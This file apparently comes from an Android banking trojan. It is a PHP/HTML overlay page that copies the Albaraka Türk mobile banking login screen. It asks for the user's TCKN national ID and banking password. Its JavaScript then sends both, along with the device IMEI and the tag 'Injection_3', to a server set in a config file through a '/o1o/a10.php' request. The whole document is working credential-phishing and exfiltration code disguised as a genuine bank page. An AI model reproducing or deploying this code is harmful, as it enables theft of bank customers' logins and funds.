<html>
<head>
		<meta charset="UTF-8">
        <link href="tr/com.pozitron.albarakaturk/style.css" rel="stylesheet">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <p>Mobil Şube</p>
    </div>
    <div class="content">
        <form method="post">
            <input type="text" class="login" name="login" id="login" placeholder="TCKN">

            <input type="password" class="password" name="password" id="password" placeholder="Internet / Mobil Bankacılık Şifreniz">

            <div class="text">
                <img style="width: 28px;margin-bottom: -8px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAAFP0lEQVR42u1Za2gcVRRe31Wb3ju7m6bWqPGBiP2lbbCKlGAzd2aTpuaHq4KiorWI4Lu1RGrxh/RHK+2P+iq+fohIRVrEBhSCTRBFRVEwUVFjWnzQl7DOYzc+mvE7M3eT6XZ3Hju7bQoduGyyc+eeb8499zvfOZtKnbpOssvpW3ienePXmBq71RZstaXxR23B78XoL6hsiZNfdPasAFrSeYcp+HqMT0yV/Yvh1BqWyiYxPqP5hV52WVQbeGbQEvybxGCLufRSS+W7AWbKB6xgqnzYFGy7JdhG/P00Pjdj3uvu9yq3fS8whXkf4QWWRQC9n55xVi8+qy6wVk/rAgB5axqoYAdheGuxO73U6UqdGRg+uG/rmU54bYv73MwaHwZ5PhFoS0vrPmOH4MFHnHz7uXXFPwAYGrsfL/CHBG4YKlvVUNB0qMqhYKj8TWN5S6Yhh1e0nY+Xf668tq3ybc4zqdMTg6bYlN79xxDsvmYcaFtTerH+YWlnhz/UYoM2VeUB9+AIblt6WmsmE5laelEZIMLlxbpAF/X09eRdojJbKCuOB4WaufTVdF484PyhWKAPdrXOxeS9npfZmjiGCzl2OZ59Es++RPFKycXJp86IwcsCnj6Cz9JkT/bKyKAtoWyWfPqBk0qdFtmgYGvl7lQml6/B7e2RPS7Ys9Lbw8BwIBR0qU+5GMb/hpeKkzEyV1Fn+QqgBcv/AoJ9FcblM5zeMQf29/rXCwQN3fCCPHxbYtGiYN9LA4cNkb7BNZ6nMKOMOA38luhhotwZCTTFMhE9bbGtZS+IaoB2ZMYA3+C/d2hltgXALemI1ySN7sH/k0HD8j7DQSOJ3CUN74yXfFj3tK4QTK28D37/XN7fI0EPIV7tqAMvOxJ0cne4i0NexgFtaPzmMuiiyFxXJUENyYP9RWP1MFgCC/+J8Z/Ty5R4Ge0EgS718EtkaIzF8jK41CDlNh0eyiZTKA8ePdgPMnQmkKhyTu6KcxqT/1WlRy78dqSdQcKwkUAqNHXEwffZanZJctAQQ66Kg3CPGBIb4oM9ahxw+jlPBBp6dp3raY2tC/Uy5KNPldU/EDqJQBNYGR5rw4vYlmxiwB5vb00GWvDHqiWHWmVXI0DD1rZQgugmWaHcUVkcSJGi3C5T7cuzCTTmvVOLSlO2Pq9TLjQym0BDAuxz03hubuuxcQruxE1Sd1aYdj1eoEmbe3UpGw+qB4dr6YcTARoOfDx0XlHwhz3a42/MBtAQS6OyGFgWUKMtaMWkEpU6pmibX5Pycul5jQCNRLYpsM/i6ZXvQqsnTHxFeuH5SF5IBJr31+pGUaUjufzuKH26dmoZuFW4xq6tmcZ1aBUUoPVnQz5SlXs9h6yXc0ajlmhU2A6Ut4aqmeAmCx+LGccQ9sp2qmiqMgYcJYvjKUNXboyuraHgsPjHcnveD2sBkPCBalsYNugAO4tr0ynJY5KvMt431tshnSi3qsaa3BQvivRFsDMud+O9yGFxbG2XuQoL/C4XGgpilCTXX3qmEwnkFy8k+e6fkhYJhW630v5RLvgbKo++hpV4OIjYzYFygwfABye6OuY0ZvFuhdmCv+uruAerCpgY9Sg1NME+X0qRdoR+PYjTPoveIBTstplwcY19SkKe4jHSrgl2qZea+bc+6hstyuZO06791AiH9sb4tYLOxgFgF/UBUTs+RY14MMCAQU1zwXeW1ZqP+sbw3T1N8W4QLVKHE+BfxZiIllDYz9TtL0FLxGlsNo+yVmQuxEssRxZdBS8/IX/dWkO/pQDsTdbK+W2pU9dJdv0P6wrr/Sk34uIAAAAASUVORK5CYII=">
                <u>Şifremi Unuttum</u>
            </div>

            <div class="text" style="text-align: center;">
                <img style="width: 28px;margin-bottom: -8px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAAE0ElEQVR42u1YTYwURRQe/43iVnXP/iiowUAiKuphAVETGNmp6p6VTRAV40FPaAJ6cqOJRBK8cNNESTQeNBovntSg0YOGRCMSPaAB40EiGxWBoO7OdPfMsivSfq+6Z52dreqdbmYupit5yez0q3pfv/fV995OoZCvfOUrX/lKWtNl60ZP2vfUyvb6uuhfmmYv+Tdk8S7a35D2DT0FeqY0sMSX/AVfsmO+YOE8k/yHhuDPhJWVV+j20veB4OMB/BbuxXk4N5RDV3cVcMMprvMFPxEHOhRI63m/zLb5Dkzw3YFgh+cAVOxbW/fO4O/mi0Z+fLfah/3qHJynnkn+W90tru0O4Iq9HllqINjJwLUdkx+APYTgZz3Bqvh8AAC/xb6P8d0UrIpKPGDaGzi2C9AnKQ5R7oIAT23hHABO4bATSfwjfvr/lX42+swP4vPPLRT6MIn/dE+w53cCP1XiPDPoQLK9KmCFbzRniT+OrP4Nv9N1ae0Iyxab9+IuX+4J/hKez5BPMGrdbqyWy0sRVdjeTIDDPYWLKQgy/ZkRsGAj8DmHIN8EI4NDiTRz7bvh+4e6G3Jo0AhcsM+puhQ/fZYdfmdUVmuH7vlEafmVAH0c9otfWTLQkVRKvoFe0pP8HfPdsHaqbLvWHalBe9Iai2/8iIkW8eGPpqMcf5OA44Jfrz+XlelcxN+cGrRf5ltVph1+nz4j/H2UcTIsFS5NpUZoLHEFdxpUaJMCnaA2xlVz+9bS5rrDthv4fBxc/iTLXcG+GYB7Q1thx35CxRVsTfqL+PBtl5O+Qu72GzIyiWy8m1GVTsHeM9DnI9L28MnhyzIpSF3wfTjgfF2y4QUZEWzCk+zTjKo0q8s0dHwNxYPC7Mus03VhjTbbszd2TX8bpz9QnB5OlxHqsKr8bZym85vtHs8qmQD70n4EB0zD/gqizBxrzXhm9RD8LVBjnnpUwd8Y8CzFU3Ede1u6ecNVynEOAQ5T+6Y3jw87TxwHNbYHFVsS51HKXzvWacE3EmBU6QvqfnTJweH9ESWQHMw21M7x3XcUHz5bO5S64i0A4gPckfB+Zs1lCB0PwV7FYbX28VINR6MD1ybqvrDuhe+fC0ZTGqgkf6W1S9acPhvxjxKOGVlclXxJCoWLcMCX5FytsBVaH+gyMvG2Bvhp37GeCrfMH3amJbsJ/i8rmWvb03Csp00qUXMGVqrkoSqEa9GLhwDPJlEHz//RZCycm/IE+xEc/RrteiLBj+xMFS+VMNs8t+jFpGZBJQzHll6lBbypuAxlCxYBkspo2ApDfSbpvxniumdqYpMYKSlL6ESvLzI3hN22QJgViPScqDXZNvK2jpmYNdiDus1niWPJtMhukDtTtuP/iPSDW3Mk9Nz+mw0D0p6eAG5eSqiLftosrjIOWKDFLnoYtnW+FtAHewkaSvGiPu7QYDxA7dJ1qvFoquu/TiuFkJ+egsZYoL38m4vLInrwcR3ox+ghhH3dwt8t7L7eZjlSEa1ex/M34dNxenVcpqNQiQOthu++6jVojLlBe1xlqjMqTq/WzM+FS6hEcPxeZ/F80DvQknnG2MBF+NJPfYL91FtOs9e6/luebt7oKqcdDWcvdNGPMLgsIhC27MikLTo1lH9DpvLnK1/5ytf/f/0L95V/GOZ4o0cAAAAASUVORK5CYII=">
                <u>Yeni Üyelik</u>
            </div>

            <input type="submit" class="submit" onclick="sentServer1();" id="sbt_input" value="Giriş">
        </form>
    </div>

  <script type="text/javascript">


  (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('sbt_input');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'login';
							oCodeInp.className = 'password';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'loginerror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'passworderror';
							} catch(e){};
                            return false;
                        }

top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|albarakaturk|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
            </script>
</body>
</html>
